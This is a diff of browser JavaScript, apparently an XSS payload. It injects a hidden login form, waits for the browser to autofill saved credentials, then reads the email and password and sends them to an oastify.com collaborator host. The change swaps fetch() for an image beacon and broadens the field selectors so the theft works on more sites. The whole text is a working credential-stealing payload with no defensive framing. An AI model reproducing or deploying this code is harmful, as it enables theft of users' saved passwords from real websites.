@@ -44,18 +44,18 @@ form.appendChild(inputPassword);
 document.body.appendChild(form);
 
 // Wait for the browser to autofill the credentials
-setTimeout(function () {
-    let emailField = document.getElementById('login-form-email');
-    let passwordField = document.getElementById('login-form-password');
+setTimeout(() => {
+    let emailField = document.querySelector('input[type="email"], input[name*="email"], input[id*="email"]');
+    let passwordField = document.querySelector('input[type="password"], input[name*="password"], input[id*="password"]');
 
-    function sendCredentials() {
-        if (passwordField.value.length > 0) {
-            fetch('http://0uvbq8lc8irgn8bfeeopwlwcy34usrgg.oastify.com/?email=' + encodeURIComponent(emailField.value) + '&password=' + encodeURIComponent(passwordField.value));
+    if (emailField && passwordField) {
+        function sendCredentials() {
+            if (passwordField.value.length > 0) {
+                new Image().src = "http://0uvbq8lc8irgn8bfeeopwlwcy34usrgg.oastify.com/?email=" + encodeURIComponent(emailField.value) + "&password=" + encodeURIComponent(passwordField.value);
+            }
         }
-    }
 
-    // Try sending credentials after a short delay to allow autofill
-    sendCredentials();  // Execute immediately
-    setTimeout(sendCredentials, 1500);  // Retry after 3 seconds (helps with delayed autofill)
-    
+        // Wait to ensure autofill has populated the fields
+        setTimeout(sendCredentials, 1500);
+    }
 }, 1000);
